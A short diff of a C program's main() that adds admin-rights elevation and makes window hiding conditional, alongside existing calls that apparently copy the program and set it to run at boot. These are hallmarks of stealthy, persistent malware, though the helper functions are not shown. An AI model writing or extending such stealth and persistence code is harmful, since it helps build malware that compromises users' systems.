@@ -5,7 +5,16 @@
 
 int main()
 {
+	if (!is_running_as_admin()) {
+		if (run_as_admin()) {
+			exit(1);
+		}
+	}
+
+#ifndef DEBUG_MODE
 	hide_window();
+#endif
+
 	srand((unsigned int)time(NULL)); // Set random generator
 	create_copy();
 	config_run_at_boot();
